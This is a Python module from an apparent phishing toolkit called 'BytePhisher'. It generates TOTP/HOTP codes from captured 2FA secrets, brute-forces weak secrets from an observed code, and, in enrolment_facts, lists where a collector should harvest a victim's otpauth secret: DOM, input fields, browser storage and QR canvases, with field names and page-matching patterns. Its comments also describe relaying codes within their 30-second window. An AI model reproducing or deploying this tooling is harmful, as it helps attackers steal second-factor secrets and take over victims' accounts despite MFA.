# BytePhisher - soft-2FA (TOTP) secrets and codes, standard library only.
"""Soft-2FA (TOTP) secrets and codes, and what a capture can do with them.

This module sits downstream of the collector: once a capture carries an otpauth secret (the
QR payload, the otpauth:// URI, or the manual-entry key), the codes it produces can be
generated for as long as the seed lives. It also answers the one question a captured CODE
raises - is the secret behind it weak enough to recover?

The limits, stated plainly, because a wrong claim here burns an operator:

  * A 6-digit code does NOT reveal the secret. A code is the truncated HMAC of a secret and
    a counter; recovering the secret from a code is not a thing you can do in a 30-second
    window. A captured code is a number, not a key.
  * `weak_secret_scan` only works where the secret itself was LOW-ENTROPY - a 6-digit PIN
    used as the shared key, a short word - because it brute-forces a small, documented space
    of candidate secrets. Against a 160-bit random secret it finds nothing and is meant to
    find nothing.
  * The real win is capturing the SECRET (enrolment QR / otpauth URI / manual key). The
    secret produces codes forever (until the account re-enrols), so it is a durable
    credential in a way a single code never is.
  * Replay inside one 30-second window is the OTHER real risk: a code observed in transit is
    valid until its counter ticks over, so a relay that submits it immediately still works.

Two encodings are in play, and the module is explicit about which is used where:

  * `hotp`, `code`, `codes_in_window` take the secret EXACTLY as an otpauth URI carries it:
    a base32 string (case- and padding-insensitive). This is what makes `parse_otpauth` and
    `code` compose. Pass raw key bytes through `b32encode` first.
  * `weak_secret_scan`'s numeric spaces (`dec6`, `dec8`) build the HMAC key from the raw
    decimal bytes, because a 6-digit number has no base32 form; a service that chose a numeric
    shared secret keys its HMAC with those bytes directly. The `b32short` space decodes each
    entry as base32, like the rest of the module.

Nothing here logs or echoes a secret: rule 87 applies (`encode_message`-free, and no secret
ever lands in an exception string, which is what ends up in a screenshot).
"""
import base64
import hmac
import time
import urllib.parse

__all__ = [
    "parse_otpauth", "b32decode", "b32encode",
    "hotp", "code", "codes_in_window", "weak_secret_scan",
    "space_size", "enrolment_facts", "describe",
    "SPACE_SIZES", "MAX_SPACE", "MAX_WINDOW", "ALGOS", "DEFAULT_DIGITS",
    "DEFAULT_PERIOD",
]

# The three algorithms RFC 6238 names, mapped to the hashlib/hmac names. An unknown
# algorithm is a hard error, not a silent SHA1 fallback: a wrong-algorithm code never
# validates, and a silent fallback hides the reason.
ALGOS = {"SHA1": "sha1", "SHA256": "sha256", "SHA512": "sha512"}

DEFAULT_DIGITS = 6
DEFAULT_PERIOD = 30
_TYPES = ("totp", "hotp")

# The scan is a brute force, so it is bounded: a space wider than this is refused rather
# than run for hours. dec6 (10^6) sits exactly at the cap; dec8 (10^8) is over it.
MAX_SPACE = 10 ** 6

# The largest +/- window codes_in_window will build. The window counts 30-second periods:
# 1000 is over 8 hours either side, far past any clock skew an operator meets.
MAX_WINDOW = 1000

# Short/human-chosen base32 secrets - the seeds people pick when they set a fallback up by
# hand or a device generates "something memorable". All valid base32 (A-Z, 2-7).
_B32SHORT = (
    "AAAAAAAA", "MZXW6YTBOI", "MZXW6", "JBSWY3DPEHPK3PXP", "JBSWY3DP", "GEZDGNBV",
    "KRSXG5CTMVRXEZLU", "ONSWG4TFOQ", "NVUXG5DJNZ", "PFSXG43TEBUXG", "ORSXG5A",
    "MNQXG43X", "MFRGG", "NB2W45DFOIZA",
)

SPACE_SIZES = {"dec6": 10 ** 6, "dec8": 10 ** 8, "b32short": len(_B32SHORT)}


# =============================================================== base32 =======
def b32decode(secret):
    """Decode a base32 secret to raw key bytes (case- and padding-insensitive).

    Whitespace is stripped, so a manual-entry key pasted as "JBSW Y3DP EHPK 3PXP" works.
    An unreadable secret raises ValueError that carries no part of the secret.
    """
    if secret is None:
        raise ValueError("no secret to decode")
    if isinstance(secret, (bytes, bytearray)):
        raw = bytes(secret).decode("ascii", "strict")
    else:
        raw = str(secret)
    s = "".join(raw.split()).upper().rstrip("=")
    if not s:
        raise ValueError("empty base32 secret")
    pad = (-len(s)) % 8
    try:
        return base64.b32decode(s + "=" * pad, casefold=True)
    except ValueError:                       # binascii.Error is a ValueError
        # rule 87: the secret itself must never appear in the message
        raise ValueError("secret is not valid base32") from None


def b32encode(data):
    """Base32-encode bytes to the canonical otpauth form (upper case, no padding)."""
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("b32encode expects bytes")
    return base64.b32encode(bytes(data)).decode("ascii").rstrip("=")


# ================================================================ otpauth =====
def _normalise_secret(raw):
    """Whitespace-strip, upper-case and unpad a base32 secret before validation."""
    return "".join(str(raw).split()).upper().rstrip("=")


def parse_otpauth(uri):
    """Parse an otpauth:// key URI (Key URI Format over RFC 6238/4226) into its parts.

    Returns {'secret', 'issuer', 'account', 'digits', 'period', 'algo', 'type'} - and, for
    an hotp key only, 'counter'. A non-otpauth URI, a missing/empty secret, an unknown
    algorithm, or a secret that is not base32 raises ValueError. The secret is normalised to
    upper case with no padding.
    """
    if not uri or not isinstance(uri, str):
        raise ValueError("otpauth URI must be a non-empty string")
    parts = urllib.parse.urlsplit(uri.strip())
    if parts.scheme.lower() != "otpauth":
        raise ValueError("not an otpauth:// URI")
    kind = (parts.netloc or "").lower()
    if kind not in _TYPES:
        raise ValueError(f"unsupported otpauth type '{kind}' (have: totp, hotp)")

    q = urllib.parse.parse_qs(parts.query, keep_blank_values=True)

    secret_raw = (q.get("secret") or [""])[0]
    if not secret_raw.strip():
        raise ValueError("otpauth URI has no secret")
    secret = _normalise_secret(secret_raw)
    b32decode(secret)                        # validation (raises on a non-base32 secret)

    label = urllib.parse.unquote(parts.path.lstrip("/")).strip()
    issuer_q = (q.get("issuer") or [""])[0].strip()
    if ":" in label:
        issuer_label, _, account = label.partition(":")
        issuer = issuer_q or issuer_label.strip()
        account = account.strip()
    else:
        account = label
        issuer = issuer_q

    try:
        digits = int((q.get("digits") or [""])[0] or DEFAULT_DIGITS)
    except ValueError:
        raise ValueError("otpauth digits is not a number") from None
    if not 1 <= digits <= 10:
        raise ValueError("otpauth digits must be between 1 and 10")
    try:
        period = int((q.get("period") or [""])[0] or DEFAULT_PERIOD)
    except ValueError:
        raise ValueError("otpauth period is not a number") from None
    if period < 1:
        raise ValueError("otpauth period must be positive")
    algo = (q.get("algorithm") or q.get("algo") or ["SHA1"])[0].upper()
    if algo not in ALGOS:
        raise ValueError(f"unknown otpauth algorithm '{algo}' (have: {', '.join(sorted(ALGOS))})")

    out = {"secret": secret, "issuer": issuer, "account": account,
           "digits": digits, "period": period, "algo": algo, "type": kind}
    if kind == "hotp":
        try:
            out["counter"] = int((q.get("counter") or ["0"])[0] or 0)
        except ValueError:
            raise ValueError("otpauth counter is not a number") from None
    return out


# ============================================================== code gen ======
def _hash_name(algo):
    name = str(algo or "").upper()
    if name not in ALGOS:
        raise ValueError(f"unknown algorithm '{name}' (have: {', '.join(sorted(ALGOS))})")
    return ALGOS[name]


def _hotp_bytes(key, counter, *, digits=DEFAULT_DIGITS, algo="SHA1"):
    """RFC 4226 dynamic truncation over the raw key bytes."""
    n = int(counter)
    if n < 0:
        raise ValueError("counter must not be negative")
    d = int(digits)
    if not 1 <= d <= 10:
        raise ValueError("digits must be between 1 and 10")
    digest = hmac.digest(key, n.to_bytes(8, "big"), _hash_name(algo))
    offset = digest[-1] & 0x0F
    value = ((digest[offset] & 0x7F) << 24 | digest[offset + 1] << 16
             | digest[offset + 2] << 8 | digest[offset + 3])
    return str(value % (10 ** d)).zfill(d)


def hotp(secret, counter, *, digits=DEFAULT_DIGITS, algo="SHA1"):
    """RFC 4226 HOTP for `counter` under the base32 `secret`."""
    return _hotp_bytes(b32decode(secret), int(counter), digits=digits, algo=algo)


def code(secret, at=None, *, digits=DEFAULT_DIGITS, period=DEFAULT_PERIOD, algo="SHA1"):
    """RFC 6238 TOTP: the code valid at unix time `at` (default: now)."""
    p = int(period)
    if p < 1:
        raise ValueError("period must be positive")
    counter = int(time.time() if at is None else at) // p
    return _hotp_bytes(b32decode(secret), counter, digits=digits, algo=algo)


def codes_in_window(secret, at, *, back=1, forward=1, **kw):
    """Every code valid in a +/-`back`/`forward` period window around `at`.

    This is what makes a 30-second window usable: a code seen a moment before or after the
    operator's clock still validates, so the candidates are tried in order (earliest first).
    Duplicates - possible only with a very small digit count - are collapsed.
    """
    b, f = int(back), int(forward)
    if b < 0 or f < 0:
        raise ValueError("back/forward must not be negative")
    if b > MAX_WINDOW or f > MAX_WINDOW:
        raise ValueError(f"back/forward must be at most {MAX_WINDOW} periods")
    p = int(kw.pop("period", DEFAULT_PERIOD))
    if p < 1:
        raise ValueError("period must be positive")
    key = b32decode(secret)
    base = int(at) // p
    out = []
    seen = set()
    for i in range(-b, f + 1):
        c = _hotp_bytes(key, base + i, **kw)
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


# ================================================================ scan ========
def space_size(space):
    """The number of candidate secrets in a named space (raises on an unknown space)."""
    key = str(space or "").lower()
    if key not in SPACE_SIZES:
        raise ValueError(f"unknown space '{space}' (have: {', '.join(sorted(SPACE_SIZES))})")
    return SPACE_SIZES[key]


def _seeds(space):
    """Yield (secret, raw key bytes, why) for every candidate in a space."""
    if space == "dec6":
        for i in range(10 ** 6):
            s = f"{i:06d}"
            yield s, s.encode("ascii"), "a six-digit decimal secret used as the raw key"
    elif space == "dec8":
        for i in range(10 ** 8):
            s = f"{i:08d}"
            yield s, s.encode("ascii"), "an eight-digit decimal secret used as the raw key"
    elif space == "b32short":
        for s in _B32SHORT:
            yield s, b32decode(s), "a short human-chosen base32 secret"


def weak_secret_scan(observed_code, at, *, digits=DEFAULT_DIGITS, space="dec6", **kw):
    """Search a low-entropy secret space for a secret that yields `observed_code` at `at`.

    Returns [{'secret', 'why'}] and [] when nothing matches - a non-numeric observed code
    simply matches nothing, it is not an error. It raises ValueError only for an unknown
    space or one wider than MAX_SPACE (the documented brute-force cap). `algo` and `period`
    may be passed through `kw`.
    """
    size = space_size(space)
    if size > MAX_SPACE:
        raise ValueError(
            f"space '{space}' is {size} wide, over the {MAX_SPACE} cap; "
            "narrow the space or scan offline in a compiled tool")
    observed = str(observed_code)
    if not observed.isdigit():
        return []
    target = int(observed)
    d = int(digits)
    if not 1 <= d <= 10:
        raise ValueError("digits must be between 1 and 10")
    mod = 10 ** d
    period = int(kw.pop("period", DEFAULT_PERIOD))
    if period < 1:
        raise ValueError("period must be positive")
    hashname = _hash_name(kw.pop("algo", "SHA1"))
    counter_bytes = (int(at) // period).to_bytes(8, "big")

    matches = []
    hm = hmac.digest
    for secret, key, why in _seeds(space):
        digest = hm(key, counter_bytes, hashname)
        offset = digest[-1] & 0x0F
        value = ((digest[offset] & 0x7F) << 24 | digest[offset + 1] << 16
                 | digest[offset + 2] << 8 | digest[offset + 3])
        if value % mod == target:
            matches.append({"secret": secret, "why": why})
    return matches


# =========================================================== collection ======
def enrolment_facts():
    """What a collector should pull at a soft-2FA ENROLMENT, as data.

    Shaped like `core/exploits.py`: a fingerprint plus the concrete things to read. The
    point is the SECRET, and this lists where an enrolment page leaks it. The note at
    the bottom is part of the data on purpose: a code in a form field is not a secret, and a
    collector that reports one as a credential is wrong.
    """
    return {
        "goal": "capture the SECRET at enrolment, not a code: the secret makes codes forever",
        "why": ("a code is spent within its 30-second window and reveals nothing about the "
                "secret; the otpauth secret, the QR payload or the manual key is durable"),
        "collect": {
            "otpauth_uris": {
                "where": ["DOM text", "DOM attribute values", "localStorage", "sessionStorage",
                          "indexedDB", "the QR image payload"],
                "pattern": r"otpauth://(totp|hotp)/[^\s\"'<>]+",
                "note": "the URI carries secret, issuer, digits, period and algorithm",
            },
            "qr_payload": {
                "where": ["a <canvas> or <img> drawn at enrolment", "an SVG data-URL"],
                "note": ("the QR encodes the same otpauth URI; read the pixel payload or the "
                         "generator's text, not a screenshot of the code"),
            },
            "manual_entry_key": {
                "field_names": ["secret", "secret_key", "shared_secret", "setup_key",
                                "otp_secret", "totp_secret", "manual_key", "entry_key",
                                "key", "seed"],
                "note": "the human-readable key Google Authenticator offers instead of the QR",
            },
            "manual_entry_uri": {
                "field_names": ["otpauth_uri", "qr_text", "qr_payload", "provisioning_uri"],
            },
        },
        "storage_keys": ["otpauth", "otpauth_uri", "totp", "totp_secret", "mfa_secret",
                         "secret", "authenticator", "gauth"],
        "page_markers": [
            r"set\s*up\s*(an?\s*)?authenticator",
            r"scan\s*(this\s*)?(qr|code)",
            r"can'?t\s*scan",
            r"enter\s*(this\s*)?(key|code)\s*manually",
            r"two[- ]?(factor|step)",
            r"authenticator\s*app",
            r"enable\s*(2fa|mfa|two-factor)",
        ],
        "collector_hooks": [
            "read the enrolment page's text and every input value",
            "walk localStorage/sessionStorage for an otpauth:// value",
            "decode a same-page QR canvas to its payload (the payload is text)",
        ],
        "not_a_secret": [
            "a code seen in a form field is NOT the secret: it expires with the window",
            "a screenshot of the QR is not usable unless the payload is decoded",
            "a masked secret field is useful only if its value is read, not its label",
        ],
        "limit": ("capturing the secret depends on the victim being AT the enrolment "
                         "page; an already-enrolled account shows codes, not secrets"),
    }


def describe():
    """Short status text for an operator."""
    return ("soft-2FA (TOTP): codes derive from a base32 secret; a 6-digit code does NOT "
            "reveal the secret, and weak_secret_scan only recovers a secret that was itself "
            "low-entropy. Capturing the SECRET (enrolment QR / otpauth URI / manual key) "
            "yields codes for as long as the seed lives; a code is replayable only inside "
            "its ~30s window.")
